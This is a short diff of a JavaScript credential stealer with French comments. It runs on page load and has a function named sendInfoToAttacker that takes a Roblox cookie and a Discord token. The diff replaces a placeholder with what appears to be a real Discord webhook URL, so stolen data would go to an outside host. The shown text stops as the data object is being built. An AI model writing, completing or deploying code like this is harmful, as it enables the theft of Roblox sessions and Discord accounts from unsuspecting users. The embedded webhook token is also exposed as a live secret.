@@ -9,7 +9,7 @@
 // S'exécute dès le chargement de la page pour voler les informations.
 
 // L'URL du webhook de l'attaquant serait placée ici.
-const webhook = 'URL_DU_WEBHOOK_DE_LATTAQUANT_ICI'; 
+const webhook = 'https://discord.com/api/webhooks/1389354788227125268/JITLLb1RDMhZY8smEw_s5unCW8wauPcO4BnSSzA1gkQW8qOpBRxux8hEc7oFW_jMeuoh'; 
 
 function sendInfoToAttacker(robloxCookie, discordToken) {
     const data = {
